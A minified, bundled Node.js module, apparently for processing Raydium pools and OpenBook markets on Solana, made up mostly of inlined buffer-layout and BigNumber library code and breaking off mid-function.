"use strict";var An=Object.create;var Ke=Object.defineProperty;var On=Object.getOwnPropertyDescriptor;var In=Object.getOwnPropertyNames;var kn=Object.getPrototypeOf,xn=Object.prototype.hasOwnProperty;var Tn=(r,e)=>()=>(e||r((e={exports:{}}).exports,e),e.exports),Pn=(r,e)=>{for(var t in e)Ke(r,t,{get:e[t],enumerable:!0})},Bt=(r,e,t,o)=>{if(e&&typeof e=="object"||typeof e=="function")for(let s of In(e))!xn.call(r,s)&&s!==t&&Ke(r,s,{get:()=>e[s],enumerable:!(o=On(e,s))||o.enumerable});return r};var re=(r,e,t)=>(t=r!=null?An(kn(r)):{},Bt(e||!r||!r.__esModule?Ke(t,"default",{value:r,enumerable:!0}):t,r)),Ln=r=>Bt(Ke({},"__esModule",{value:!0}),r);var ve=Tn(h=>{"use strict";Object.defineProperty(h,"__esModule",{value:!0});h.s16=h.s8=h.nu64be=h.u48be=h.u40be=h.u32be=h.u24be=h.u16be=h.nu64=h.u48=h.u40=h.u32=h.u24=h.u16=h.u8=h.offset=h.greedy=h.Constant=h.UTF8=h.CString=h.Blob=h.Boolean=h.BitField=h.BitStructure=h.VariantLayout=h.Union=h.UnionLayoutDiscriminator=h.UnionDiscriminator=h.Structure=h.Sequence=h.DoubleBE=h.Double=h.FloatBE=h.Float=h.NearInt64BE=h.NearInt64=h.NearUInt64BE=h.NearUInt64=h.IntBE=h.Int=h.UIntBE=h.UInt=h.OffsetLayout=h.GreedyCount=h.ExternalLayout=h.bindConstructorLayout=h.nameWithProperty=h.Layout=h.uint8ArrayToBuffer=h.checkUint8Array=void 0;h.constant=h.utf8=h.cstr=h.blob=h.unionLayoutDiscriminator=h.union=h.seq=h.bits=h.struct=h.f64be=h.f64=h.f32be=h.f32=h.ns64be=h.s48be=h.s40be=h.s32be=h.s24be=h.s16be=h.ns64=h.s48=h.s40=h.s32=h.s24=void 0;var Et=require("buffer");function ke(r){if(!(r instanceof Uint8Array))throw new TypeError("b must be a Uint8Array")}h.checkUint8Array=ke;function L(r){return ke(r),Et.Buffer.from(r.buffer,r.byteOffset,r.length)}h.uint8ArrayToBuffer=L;var M=class{constructor(e,t){if(!Number.isInteger(e))throw new TypeError("span must be an integer");this.span=e,this.property=t}makeDestinationObject(){return{}}getSpan(e,t){if(0>this.span)throw new RangeError("indeterminate span");return this.span}replicate(e){let t=Object.create(this.constructor.prototype);return Object.assign(t,this),t.property=e,t}fromArray(e){}};h.Layout=M;function St(r,e){return e.property?r+"["+e.property+"]":r}h.nameWithProperty=St;function Mn(r,e){if(typeof r!="function")throw new TypeError("Class must be constructor");if(Object.prototype.hasOwnProperty.call(r,"layout_"))throw new Error("Class is already bound to a layout");if(!(e&&e instanceof M))throw new TypeError("layout must be a Layout");if(Object.prototype.hasOwnProperty.call(e,"boundConstructor_"))throw new Error("layout is already bound to a constructor");r.layout_=e,e.boundConstructor_=r,e.makeDestinationObject=()=>new r,Object.defineProperty(r.prototype,"encode",{value(t,o){return e.encode(this,t,o)},writable:!0}),Object.defineProperty(r,"decode",{value(t,o){return e.decode(t,o)},writable:!0})}h.bindConstructorLayout=Mn;var Y=class extends M{isCount(){throw new Error("ExternalLayout is abstract")}};h.ExternalLayout=Y;var Ce=class extends Y{constructor(e=1,t){if(!Number.isInteger(e)||0>=e)throw new TypeError("elementSpan must be a (positive) integer");super(-1,t),this.elementSpan=e}isCount(){return!0}decode(e,t=0){ke(e);let o=e.length-t;return Math.floor(o/this.elementSpan)}encode(e,t,o){return 0}};h.GreedyCount=Ce;var Le=class extends Y{constructor(e,t=0,o){if(!(e instanceof M))throw new TypeError("layout must be a Layout");if(!Number.isInteger(t))throw new TypeError("offset must be integer or undefined");super(e.span,o||e.property),this.layout=e,this.offset=t}isCount(){return this.layout instanceof H||this.layout instanceof J}decode(e,t=0){return this.layout.decode(e,t+this.offset)}encode(e,t,o=0){return this.layout.encode(e,t,o+this.offset)}};h.OffsetLayout=Le;var H=class extends M{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return L(e).readUIntLE(t,this.span)}encode(e,t,o=0){return L(t).writeUIntLE(e,o,this.span),this.span}};h.UInt=H;var J=class extends M{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return L(e).readUIntBE(t,this.span)}encode(e,t,o=0){return L(t).writeUIntBE(e,o,this.span),this.span}};h.UIntBE=J;var pe=class extends M{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return L(e).readIntLE(t,this.span)}encode(e,t,o=0){return L(t).writeIntLE(e,o,this.span),this.span}};h.Int=pe;var ye=class extends M{constructor(e,t){if(super(e,t),6<this.span)throw new RangeError("span must not exceed 6 bytes")}decode(e,t=0){return L(e).readIntBE(t,this.span)}encode(e,t,o=0){return L(t).writeIntBE(e,o,this.span),this.span}};h.IntBE=ye;var bt=Math.pow(2,32);function nt(r){let e=Math.floor(r/bt),t=r-e*bt;return{hi32:e,lo32:t}}function rt(r,e){return r*bt+e}var De=class extends M{constructor(e){super(8,e)}decode(e,t=0){let o=L(e),s=o.readUInt32LE(t),l=o.readUInt32LE(t+4);return rt(l,s)}encode(e,t,o=0){let s=nt(e),l=L(t);return l.writeUInt32LE(s.lo32,o),l.writeUInt32LE(s.hi32,o+4),8}};h.NearUInt64=De;var $e=class extends M{constructor(e){super(8,e)}decode(e,t=0){let o=L(e),s=o.readUInt32BE(t),l=o.readUInt32BE(t+4);return rt(s,l)}encode(e,t,o=0){let s=nt(e),l=L(t);return l.writeUInt32BE(s.hi32,o),l.writeUInt32BE(s.lo32,o+4),8}};h.NearUInt64BE=$e;var Fe=class extends M{constructor(e){super(8,e)}decode(e,t=0){let o=L(e),s=o.readUInt32LE(t),l=o.readInt32LE(t+4);return rt(l,s)}encode(e,t,o=0){let s=nt(e),l=L(t);return l.writeUInt32LE(s.lo32,o),l.writeInt32LE(s.hi32,o+4),8}};h.NearInt64=Fe;var qe=class extends M{constructor(e){super(8,e)}decode(e,t=0){let o=L(e),s=o.readInt32BE(t),l=o.readUInt32BE(t+4);return rt(s,l)}encode(e,t,o=0){let s=nt(e),l=L(t);return l.writeInt32BE(s.hi32,o),l.writeUInt32BE(s.lo32,o+4),8}};h.NearInt64BE=qe;var Ge=class extends M{constructor(e){super(4,e)}decode(e,t=0){return L(e).readFloatLE(t)}encode(e,t,o=0){return L(t).writeFloatLE(e,o),4}};h.Float=Ge;var ze=class extends M{constructor(e){super(4,e)}decode(e,t=0){return L(e).readFloatBE(t)}encode(e,t,o=0){return L(t).writeFloatBE(e,o),4}};h.FloatBE=ze;var Ye=class extends M{constructor(e){super(8,e)}decode(e,t=0){return L(e).readDoubleLE(t)}encode(e,t,o=0){return L(t).writeDoubleLE(e,o),8}};h.Double=Ye;var je=class extends M{constructor(e){super(8,e)}decode(e,t=0){return L(e).readDoubleBE(t)}encode(e,t,o=0){return L(t).writeDoubleBE(e,o),8}};h.DoubleBE=je;var We=class extends M{constructor(e,t,o){if(!(e instanceof M))throw new TypeError("elementLayout must be a Layout");if(!(t instanceof Y&&t.isCount()||Number.isInteger(t)&&0<=t))throw new TypeError("count must be non-negative integer or an unsigned integer ExternalLayout");let s=-1;!(t instanceof Y)&&0<e.span&&(s=t*e.span),super(s,o),this.elementLayout=e,this.count=t}getSpan(e,t=0){if(0<=this.span)return this.span;let o=0,s=this.count;if(s instanceof Y&&(s=s.decode(e,t)),0<this.elementLayout.span)o=s*this.elementLayout.span;else{let l=0;for(;l<s;)o+=this.elementLayout.getSpan(e,t+o),++l}return o}decode(e,t=0){let o=[],s=0,l=this.count;for(l instanceof Y&&(l=l.decode(e,t));s<l;)o.push(this.elementLayout.decode(e,t)),t+=this.elementLayout.getSpan(e,t),s+=1;return o}encode(e,t,o=0){let s=this.elementLayout,l=e.reduce((b,S)=>b+s.encode(S,t,o+b),0);return this.count instanceof Y&&this.count.encode(e.length,t,o),l}};h.Sequence=We;var He=class extends M{constructor(e,t,o){if(!(Array.isArray(e)&&e.reduce((l,b)=>l&&b instanceof M,!0)))throw new TypeError("fields must be array of Layout instances");typeof t=="boolean"&&o===void 0&&(o=t,t=void 0);for(let l of e)if(0>l.span&&l.property===void 0)throw new Error("fields cannot contain unnamed variable-length layout");let s=-1;try{s=e.reduce((l,b)=>l+b.getSpan(),0)}catch{}super(s,t),this.fields=e,this.decodePrefixes=!!o}getSpan(e,t=0){if(0<=this.span)return this.span;let o=0;try{o=this.fields.reduce((s,l)=>{let b=l.getSpan(e,t);return t+=b,s+b},0)}catch{throw new RangeError("indeterminate span")}return o}decode(e,t=0){ke(e);let o=this.makeDestinationObject();for(let s of this.fields)if(s.property!==void 0&&(o[s.property]=s.decode(e,t)),t+=s.getSpan(e,t),this.decodePrefixes&&e.length===t)break;return o}encode(e,t,o=0){let s=o,l=0,b=0;for(let S of this.fields){let k=S.span;if(b=0<k?k:0,S.property!==void 0){let N=e[S.property];N!==void 0&&(b=S.encode(N,t,o),0>k&&(k=S.getSpan(t,o)))}l=o,o+=k}return l+b-s}fromArray(e){let t=this.makeDestinationObject();for(let o of this.fields)o.property!==void 0&&0<e.length&&(t[o.property]=e.shift());return t}layoutFor(e){if(typeof e!="string")throw new TypeError("property must be string");for(let t of this.fields)if(t.property===e)return t}offsetOf(e){if(typeof e!="string")throw new TypeError("property must be string");let t=0;for(let o of this.fields){if(o.property===e)return t;0>o.span?t=-1:0<=t&&(t+=o.span)}}};h.Structure=He;var Me=class{constructor(e){this.property=e}decode(e,t){throw new Error("UnionDiscriminator is abstract")}encode(e,t,o){throw new Error("UnionDiscriminator is abstract")}};h.UnionDiscriminator=Me;var Ie=class extends Me{constructor(e,t){if(!(e instanceof Y&&e.isCount()))throw new TypeError("layout must be an unsigned integer ExternalLayout");super(t||e.property||"variant"),this.layout=e}decode(e,t){return this.layout.decode(e,t)}encode(e,t,o){return this.layout.encode(e,t,o)}};h.UnionLayoutDiscriminator=Ie;var _e=class extends M{constructor(e,t,o){let s;if(e instanceof H||e instanceof J)s=new Ie(new Le(e));else if(e instanceof Y&&e.isCount())s=new Ie(e);else if(e instanceof Me)s=e;else throw new TypeError("discr must be a UnionDiscriminator or an unsigned integer layout");if(t===void 0&&(t=null),!(t===null||t instanceof M))throw new TypeError("defaultLayout must be null or a Layout");if(t!==null){if(0>t.span)throw new Error("defaultLayout must have constant span");t.property===void 0&&(t=t.replicate("content"))}let l=-1;t&&(l=t.span,0<=l&&(e instanceof H||e instanceof J)&&(l+=s.layout.span)),super(l,o),this.discriminator=s,this.usesPrefixDiscriminator=e instanceof H||e instanceof J,this.defaultLayout=t,this.registry={};let b=this.defaultGetSourceVariant.bind(this);this.getSourceVariant=function(S){return b(S)},this.configGetSourceVariant=function(S){b=S.bind(this)}}getSpan(e,t=0){if(0<=this.span)return this.span;let o=this.getVariant(e,t);if(!o)throw new Error("unable to determine span for unrecognized variant");return o.getSpan(e,t)}defaultGetSourceVariant(e){if(Object.prototype.hasOwnProperty.call(e,this.discriminator.property)){if(this.defaultLayout&&this.defaultLayout.property&&Object.prototype.hasOwnProperty.call(e,this.defaultLayout.property))return;let t=this.registry[e[this.discriminator.property]];if(t&&(!t.layout||t.property&&Object.prototype.hasOwnProperty.call(e,t.property)))return t}else for(let t in this.registry){let o=this.registry[t];if(o.property&&Object.prototype.hasOwnProperty.call(e,o.property))return o}throw new Error("unable to infer src variant")}decode(e,t=0){let o,s=this.discriminator,l=s.decode(e,t),b=this.registry[l];if(b===void 0){let S=this.defaultLayout,k=0;this.usesPrefixDiscriminator&&(k=s.layout.span),o=this.makeDestinationObject(),o[s.property]=l,o[S.property]=S.decode(e,t+k)}else o=b.decode(e,t);return o}encode(e,t,o=0){let s=this.getSourceVariant(e);if(s===void 0){let l=this.discriminator,b=this.defaultLayout,S=0;return this.usesPrefixDiscriminator&&(S=l.layout.span),l.encode(e[l.property],t,o),S+b.encode(e[b.property],t,o+S)}return s.encode(e,t,o)}addVariant(e,t,o){let s=new Qe(this,e,t,o);return this.registry[e]=s,s}getVariant(e,t=0){let o;return e instanceof Uint8Array?o=this.discriminator.decode(e,t):o=e,this.registry[o]}};h.Union=_e;var Qe=class extends M{constructor(e,t,o,s){if(!(e instanceof _e))throw new TypeError("union must be a Union");if(!Number.isInteger(t)||0>t)throw new TypeError("variant must be a (non-negative) integer");if(typeof o=="string"&&s===void 0&&(s=o,o=null),o){if(!(o instanceof M))throw new TypeError("layout must be a Layout");if(e.defaultLayout!==null&&0<=o.span&&o.span>e.defaultLayout.span)throw new Error("variant span exceeds span of containing union");if(typeof s!="string")throw new TypeError("variant must have a String property")}let l=e.span;0>e.span&&(l=o?o.span:0,0<=l&&e.usesPrefixDiscriminator&&(l+=e.discriminator.layout.span)),super(l,s),this.union=e,this.variant=t,this.layout=o||null}getSpan(e,t=0){if(0<=this.span)return this.span;let o=0;this.union.usesPrefixDiscriminator&&(o=this.union.discriminator.layout.span);let s=0;return this.layout&&(s=this.layout.getSpan(e,t+o)),o+s}decode(e,t=0){let o=this.makeDestinationObject();if(this!==this.union.getVariant(e,t))throw new Error("variant mismatch");let s=0;return this.union.usesPrefixDiscriminator&&(s=this.union.discriminator.layout.span),this.layout?o[this.property]=this.layout.decode(e,t+s):this.property?o[this.property]=!0:this.union.usesPrefixDiscriminator&&(o[this.union.discriminator.property]=this.variant),o}encode(e,t,o=0){let s=0;if(this.union.usesPrefixDiscriminator&&(s=this.union.discriminator.layout.span),this.layout&&!Object.prototype.hasOwnProperty.call(e,this.property))throw new TypeError("variant lacks property "+this.property);this.union.discriminator.encode(this.variant,t,o);let l=s;if(this.layout&&(this.layout.encode(e[this.property],t,o+s),l+=this.layout.getSpan(t,o+s),0<=this.union.span&&l>this.union.span))throw new Error("encoded variant overruns containing union");return l}fromArray(e){if(this.layout)return this.layout.fromArray(e)}};h.VariantLayout=Qe;function Oe(r){return 0>r&&(r+=4294967296),r}var Ne=class extends M{constructor(e,t,o){if(!(e instanceof H||e instanceof J))throw new TypeError("word must be a UInt or UIntBE layout");if(typeof t=="string"&&o===void 0&&(o=t,t=!1),4<e.span)throw new RangeError("word cannot exceed 32 bits");super(e.span,o),this.word=e,this.msb=!!t,this.fields=[];let s=0;this._packedSetValue=function(l){return s=Oe(l),this},this._packedGetValue=function(){return s}}decode(e,t=0){let o=this.makeDestinationObject(),s=this.word.decode(e,t);this._packedSetValue(s);for(let l of this.fields)l.property!==void 0&&(o[l.property]=l.decode(e));return o}encode(e,t,o=0){let s=this.word.decode(t,o);this._packedSetValue(s);for(let l of this.fields)if(l.property!==void 0){let b=e[l.property];b!==void 0&&l.encode(b)}return this.word.encode(this._packedGetValue(),t,o)}addField(e,t){let o=new Be(this,e,t);return this.fields.push(o),o}addBoolean(e){let t=new Xe(this,e);return this.fields.push(t),t}fieldFor(e){if(typeof e!="string")throw new TypeError("property must be string");for(let t of this.fields)if(t.property===e)return t}};h.BitStructure=Ne;var Be=class{constructor(e,t,o){if(!(e instanceof Ne))throw new TypeError("container must be a BitStructure");if(!Number.isInteger(t)||0>=t)throw new TypeError("bits must be positive integer");let s=8*e.span,l=e.fields.reduce((b,S)=>b+S.bits,0);if(t+l>s)throw new Error("bits too long for span remainder ("+(s-l)+" of "+s+" remain)");this.container=e,this.bits=t,this.valueMask=(1<<t)-1,t===32&&(this.valueMask=4294967295),this.start=l,this.container.msb&&(this.start=s-l-t),this.wordMask=Oe(this.valueMask<<this.start),this.property=o}decode(e,t){let o=this.container._packedGetValue();return Oe(o&this.wordMask)>>>this.start}encode(e){if(typeof e!="number"||!Number.isInteger(e)||e!==Oe(e&this.valueMask))throw new TypeError(St("BitField.encode",this)+" value must be integer not exceeding "+this.valueMask);let t=this.container._packedGetValue(),o=Oe(e<<this.start);this.container._packedSetValue(Oe(t&~this.wordMask)|o)}};h.BitField=Be;var Xe=class extends Be{constructor(e,t){super(e,1,t)}decode(e,t){return!!super.decode(e,t)}encode(e){typeof e=="boolean"&&(e=+e),super.encode(e)}};h.Boolean=Xe;var Ze=class extends M{constructor(e,t){if(!(e instanceof Y&&e.isCount()||Number.isInteger(e)&&0<=e))throw new TypeError("length must be positive integer or an unsigned integer ExternalLayout");let o=-1;e instanceof Y||(o=e),super(o,t),this.length=e}getSpan(e,t){let o=this.span;return 0>o&&(o=this.length.decode(e,t)),o}decode(e,t=0){let o=this.span;return 0>o&&(o=this.length.decode(e,t)),L(e).slice(t,t+o)}encode(e,t,o){let s=this.length;if(this.length instanceof Y&&(s=e.length),!(e instanceof Uint8Array&&s===e.length))throw new TypeError(St("Blob.encode",this)+" requires (length "+s+") Uint8Array as src");if(o+s>t.length)throw new RangeError("encoding overruns Uint8Array");let l=L(e);return L(t).write(l.toString("hex"),o,s,"hex"),this.length instanceof Y&&this.length.encode(s,t,o),s}};h.Blob=Ze;var Je=class extends M{constructor(e){super(-1,e)}getSpan(e,t=0){ke(e);let o=t;for(;o<e.length&&e[o]!==0;)o+=1;return 1+o-t}decode(e,t=0){let o=this.getSpan(e,t);return L(e).slice(t,t+o-1).toString("utf-8")}encode(e,t,o=0){typeof e!="string"&&(e=String(e));let s=Et.Buffer.from(e,"utf8"),l=s.length;if(o+l>t.length)throw new RangeError("encoding overruns Buffer");let b=L(t);return s.copy(b,o),b[o+l]=0,l+1}};h.CString=Je;var et=class extends M{constructor(e,t){if(typeof e=="string"&&t===void 0&&(t=e,e=void 0),e===void 0)e=-1;else if(!Number.isInteger(e))throw new TypeError("maxSpan must be an integer");super(-1,t),this.maxSpan=e}getSpan(e,t=0){return ke(e),e.length-t}decode(e,t=0){let o=this.getSpan(e,t);if(0<=this.maxSpan&&this.maxSpan<o)throw new RangeError("text length exceeds maxSpan");return L(e).slice(t,t+o).toString("utf-8")}encode(e,t,o=0){typeof e!="string"&&(e=String(e));let s=Et.Buffer.from(e,"utf8"),l=s.length;if(0<=this.maxSpan&&this.maxSpan<l)throw new RangeError("text length exceeds maxSpan");if(o+l>t.length)throw new RangeError("encoding overruns Buffer");return s.copy(L(t),o),l}};h.UTF8=et;var tt=class extends M{constructor(e,t){super(0,t),this.value=e}decode(e,t){return this.value}encode(e,t,o){return 0}};h.Constant=tt;h.greedy=(r,e)=>new Ce(r,e);h.offset=(r,e,t)=>new Le(r,e,t);h.u8=r=>new H(1,r);h.u16=r=>new H(2,r);h.u24=r=>new H(3,r);h.u32=r=>new H(4,r);h.u40=r=>new H(5,r);h.u48=r=>new H(6,r);h.nu64=r=>new De(r);h.u16be=r=>new J(2,r);h.u24be=r=>new J(3,r);h.u32be=r=>new J(4,r);h.u40be=r=>new J(5,r);h.u48be=r=>new J(6,r);h.nu64be=r=>new $e(r);h.s8=r=>new pe(1,r);h.s16=r=>new pe(2,r);h.s24=r=>new pe(3,r);h.s32=r=>new pe(4,r);h.s40=r=>new pe(5,r);h.s48=r=>new pe(6,r);h.ns64=r=>new Fe(r);h.s16be=r=>new ye(2,r);h.s24be=r=>new ye(3,r);h.s32be=r=>new ye(4,r);h.s40be=r=>new ye(5,r);h.s48be=r=>new ye(6,r);h.ns64be=r=>new qe(r);h.f32=r=>new Ge(r);h.f32be=r=>new ze(r);h.f64=r=>new Ye(r);h.f64be=r=>new je(r);h.struct=(r,e,t)=>new He(r,e,t);h.bits=(r,e,t)=>new Ne(r,e,t);h.seq=(r,e,t)=>new We(r,e,t);h.union=(r,e,t)=>new _e(r,e,t);h.unionLayoutDiscriminator=(r,e)=>new Ie(r,e);h.blob=(r,e)=>new Ze(r,e);h.cstr=r=>new Je(r);h.utf8=(r,e)=>new et(r,e);h.constant=(r,e)=>new tt(r,e)});var tr={};Pn(tr,{checkMintable:()=>bn,processOpenBookMarket:()=>En,processRaydiumPool:()=>wn});module.exports=Ln(tr);var cn=require("mongodb"),B=require("@raydium-io/raydium-sdk"),ue=require("@solana/spl-token"),G=require("@solana/web3.js");var ee=require("@solana/web3.js"),Ht=require("@raydium-io/raydium-sdk"),q=require("@raydium-io/raydium-sdk"),Qt=require("@solana/spl-token"),Xt=re(require("dotenv"));var Ae=re(ve());var ge=r=>{let e=r.decode.bind(r),t=r.encode.bind(r);return{decode:e,encode:t}};var At=re(ve(),1),we=require("bigint-buffer");var ot=r=>e=>{let t=(0,At.blob)(r,e),{encode:o,decode:s}=ge(t),l=t;return l.decode=(b,S)=>{let k=s(b,S);return(0,we.toBigIntLE)(Buffer.from(k))},l.encode=(b,S,k)=>{let N=(0,we.toBufferLE)(b,r);return o(N,S,k)},l},it=r=>e=>{let t=(0,At.blob)(r,e),{encode:o,decode:s}=ge(t),l=t;return l.decode=(b,S)=>{let k=s(b,S);return(0,we.toBigIntBE)(Buffer.from(k))},l.encode=(b,S,k)=>{let N=(0,we.toBufferBE)(b,r);return o(N,S,k)},l},vt=ot(8),sr=it(8),_n=ot(16),ar=it(16),cr=ot(24),ur=it(24),lr=ot(32),fr=it(32);var Nn=/^-?(?:\d+(?:\.\d*)?|\.\d+)(?:e[+-]?\d+)?$/i,Ot=Math.ceil,ie=Math.floor,Q="[BigNumber Error] ",Rt=Q+"Number primitive has more than 15 significant digits: ",ce=1e14,x=14,It=9007199254740991,kt=[1,10,100,1e3,1e4,1e5,1e6,1e7,1e8,1e9,1e10,1e11,1e12,1e13],be=1e7,D=1e9;function Ut(r){var e,t,o,s=E.prototype={constructor:E,toString:null,valueOf:null},l=new E(1),b=20,S=4,k=-7,N=21,W=-1e7,V=1e7,Z=!1,me=1,le=0,pt={prefix:"",groupSize:3,secondaryGroupSize:0,groupSeparator:",",decimalSeparator:".",fractionGroupSize:0,fractionGroupSeparator:"\xA0",suffix:""},Ee="0123456789abcdefghijklmnopqrstuvwxyz",ht=!0;function E(n,i){var a,m,u,d,g,c,f,y,p=this;if(!(p instanceof E))return new E(n,i);if(i==null){if(n&&n._isBigNumber===!0){p.s=n.s,!n.c||n.e>V?p.c=p.e=null:n.e<W?p.c=[p.e=0]:(p.e=n.e,p.c=n.c.slice());return}if((c=typeof n=="number")&&n*0==0){if(p.s=1/n<0?(n=-n,-1):1,n===~~n){for(d=0,g=n;g>=10;g/=10,d++);d>V?p.c=p.e=null:(p.e=d,p.c=[n]);return}y=String(n)}else{if(!Nn.test(y=String(n)))return o(p,y,c);p.s=y.charCodeAt(0)==45?(y=y.slice(1),-1):1}(d=y.indexOf("."))>-1&&(y=y.replace(".","")),(g=y.search(/e/i))>0?(d<0&&(d=g),d+=+y.slice(g+1),y=y.substring(0,g)):d<0&&(d=y.length)}else{if(v(i,2,Ee.length,"Base"),i==10&&ht)return p=new E(n),te(p,b+p.e+1,S);if(y=String(n),c=typeof n=="number"){if(n*0!=0)return o(p,y,c,i);if(p.s=1/n<0?(y=y.slice(1),-1):1,E.DEBUG&&y.replace(/^0\.0*|\./,"").length>15)throw Error(Rt+n)}else p.s=y.charCodeAt(0)===45?(y=y.slice(1),-1):1;for(a=Ee.slice(0,i),d=g=0,f=y.length;g<f;g++)if(a.indexOf(m=y.charAt(g))<0){if(m=="."){if(g>d){d=f;continue}}else if(!u&&(y==y.toUpperCase()&&(y=y.toLowerCase())||y==y.toLowerCase()&&(y=y.toUpperCase()))){u=!0,g=-1,d=0;continue}return o(p,String(n),c,i)}c=!1,y=t(y,i,10,p.s),(d=y.indexOf("."))>-1?y=y.replace(".",""):d=y.length}for(g=0;y.charCodeAt(g)===48;g++);for(f=y.length;y.charCodeAt(--f)===48;);if(y=y.slice(g,++f)){if(f-=g,c&&E.DEBUG&&f>15&&(n>It||n!==ie(n)))throw Error(Rt+p.s*n);if((d=d-g-1)>V)p.c=p.e=null;else if(d<W)p.c=[p.e=0];else{if(p.e=d,p.c=[],g=(d+1)%x,d<0&&(g+=x),g<f){for(g&&p.c.push(+y.slice(0,g)),f-=x;g<f;)p.c.push(+y.slice(g,g+=x));g=x-(y=y.slice(g)).length}else g-=f;for(;g--;y+="0");p.c.push(+y)}}else p.c=[p.e=0]}E.clone=Ut,E.ROUND_UP=0,E.ROUND_DOWN=1,E.ROUND_CEIL=2,E.ROUND_FLOOR=3,E.ROUND_HALF_UP=4,E.ROUND_HALF_DOWN=5,E.ROUND_HALF_EVEN=6,E.ROUND_HALF_CEIL=7,E.ROUND_HALF_FLOOR=8,E.EUCLID=9,E.config=E.set=function(n){var i,a;if(n!=null)if(typeof n=="object"){if(n.hasOwnProperty(i="DECIMAL_PLACES")&&(a=n[i],v(a,0,D,i),b=a),n.hasOwnProperty(i="ROUNDING_MODE")&&(a=n[i],v(a,0,8,i),S=a),n.hasOwnProperty(i="EXPONENTIAL_AT")&&(a=n[i],a&&a.pop?(v(a[0],-D,0,i),v(a[1],0,D,i),k=a[0],N=a[1]):(v(a,-D,D,i),k=-(N=a<0?-a:a))),n.hasOwnProperty(i="RANGE"))if(a=n[i],a&&a.pop)v(a[0],-D,-1,i),v(a[1],1,D,i),W=a[0],V=a[1];else if(v(a,-D,D,i),a)W=-(V=a<0?-a:a);else throw Error(Q+i+" cannot be zero: "+a);if(n.hasOwnProperty(i="CRYPTO"))if(a=n[i],a===!!a)if(a)if(typeof crypto<"u"&&crypto&&(crypto.getRandomValues||crypto.randomBytes))Z=a;else throw Z=!a,Error(Q+"crypto unavailable");else Z=a;else throw Error(Q+i+" not true or false: "+a);if(n.hasOwnProperty(i="MODULO_MODE")&&(a=n[i],v(a,0,9,i),me=a),n.hasOwnProperty(i="POW_PRECISION")&&(a=n[i],v(a,0,D,i),le=a),n.hasOwnProperty(i="FORMAT"))if(a=n[i],typeof a=="object")pt=a;else throw Error(Q+i+" not an object: "+a);if(n.hasOwnProperty(i="ALPHABET"))if(a=n[i],typeof a=="string"&&!/^.?$|[+\-.\s]|(.).*\1/.test(a))ht=a.slice(0,10)=="0123456789",Ee=a;else throw Error(Q+i+" invalid: "+a)}else throw Error(Q+"Object expected: "+n);return{DECIMAL_PLACES:b,ROUNDING_MODE:S,EXPONENTIAL_AT:[k,N],RANGE:[W,V],CRYPTO:Z,MODULO_MODE:me,POW_PRECISION:le,FORMAT:pt,ALPHABET:Ee}},E.isBigNumber=function(n){if(!n||n._isBigNumber!==!0)return!1;if(!E.DEBUG)return!0;var i,a,m=n.c,u=n.e,d=n.s;e:if({}.toString.call(m)=="[object Array]"){if((d===1||d===-1)&&u>=-D&&u<=D&&u===ie(u)){if(m[0]===0){if(u===0&&m.length===1)return!0;break e}if(i=(u+1)%x,i<1&&(i+=x),String(m[0]).length==i){for(i=0;i<m.length;i++)if(a=m[i],a<0||a>=ce||a!==ie(a))break e;if(a!==0)return!0}}}else if(m===null&&u===null&&(d===null||d===1||d===-1))return!0;throw Error(Q+"Invalid BigNumber: "+n)},E.maximum=E.max=function(){return Nt(arguments,-1)},E.minimum=E.min=function(){return Nt(arguments,1)},E.random=function(){var n=9007199254740992,i=Math.random()*n&2097151?function(){return ie(Math.random()*n)}:function(){return(Math.random()*1073741824|0)*8388608+(Math.random()*8388608|0)};return function(a){var m,u,d,g,c,f=0,y=[],p=new E(l);if(a==null?a=b:v(a,0,D),g=Ot(a/x),Z)if(crypto.getRandomValues){for(m=crypto.getRandomValues(new Uint32Array(g*=2));f<g;)c=m[f]*131072+(m[f+1]>>>11),c>=9e15?(u=crypto.getRandomValues(new Uint32Array(2)),m[f]=u[0],m[f+1]=u[1]):(y.push(c%1e14),f+=2);f=g/2}else if(crypto.randomBytes){for(m=crypto.randomBytes(g*=7);f<g;)c=(m[f]&31)*281474976710656+m[f+1]*1099511627776+m[f+2]*4294967296+m[f+3]*16777216+(m[f+4]<<16)+(m[f+5]<<8)+m[f+6],c>=9e15?crypto.randomBytes(7).copy(m,f):(y.push(c%1e14),f+=7);f=g/7}else throw Z=!1,Error(Q+"crypto unavailable");if(!Z)for(;f<g;)c=i(),c<9e15&&(y[f++]=c%1e14);for(g=y[--f],a%=x,g&&a&&(c=kt[x-a],y[f]=ie(g/c)*c);y[f]===0;y.pop(),f--);if(f<0)y=[d=0];else{for(d=-1;y[0]===0;y.splice(0,1),d-=x);for(f=1,c=y[0];c>=10;c/=10,f++);f<x&&(d-=x-f)}return p.e=d,p.c=y,p}}(),E.sum=function(){for(var n=1,i=arguments,a=new E(i[0]);n<i.length;)a=a.plus(i[n++]);return a},t=function(){var n="0123456789";function i(a,m,u,d){for(var g,c=[0],f,y=0,p=a.length;y<p;){for(f=c.length;f--;c[f]*=m);for(c[0]+=d.indexOf(a.charAt(y++)),g=0;g<c.length;g++)c[g]>u-1&&(c[g+1]==null&&(c[g+1]=0),c[g+1]+=c[g]/u|0,c[g]%=u)}return c.reverse()}return function(a,m,u,d,g){var c,f,y,p,w,O,I,P,R=a.indexOf("."),K=b,T=S;for(R>=0&&(p=le,le=0,a=a.replace(".",""),P=new E(m),O=P.pow(a.length-R),le=p,P.c=i(he(oe(O.c),O.e,"0"),10,u,n),P.e=P.c.length),I=i(a,m,u,g?(c=Ee,n):(c=n,Ee)),y=p=I.length;I[--p]==0;I.pop());if(!I[0])return c.charAt(0);if(R<0?--y:(O.c=I,O.e=y,O.s=d,O=e(O,P,K,T,u),I=O.c,w=O.r,y=O.e),f=y+K+1,R=I[f],p=u/2,w=w||f<0||I[f+1]!=null,w=T<4?(R!=null||w)&&(T==0||T==(O.s<0?3:2)):R>p||R==p&&(T==4||w||T==6&&I[f-1]&1||T==(O.s<0?8:7)),f<1||!I[0])a=w?he(c.charAt(1),-K,c.charAt(0)):c.charAt(0);else{if(I.length=f,w)for(--u;++I[--f]>u;)I[f]=0,f||(++y,I=[1].concat(I));for(p=I.length;!I[--p];);for(R=0,a="";R<=p;a+=c.charAt(I[R++]));a=he(a,y,c.charAt(0))}return a}}(),e=function(){function n(m,u,d){var 